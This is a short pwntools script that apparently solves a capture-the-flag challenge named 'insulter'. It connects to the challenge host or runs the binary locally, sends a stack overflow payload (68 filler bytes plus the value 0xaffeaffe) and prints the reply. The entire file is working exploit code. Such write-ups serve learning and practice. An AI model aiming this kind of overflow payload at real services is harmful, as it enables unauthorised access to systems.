#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(terminal=['tmux','new-window'])
exe = context.binary = ELF('insulter')

host = args.HOST or 'insulter.redrocket.club'
port = int(args.PORT or 6666)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b *0x00400b30
'''.format(**locals())

# -- Exploit goes here --

io = start()

buf = b'A'*68+p32(0xaffeaffe)
io.sendline(buf)
io.recvuntil('name: ')
log.warning(io.recvline().decode())
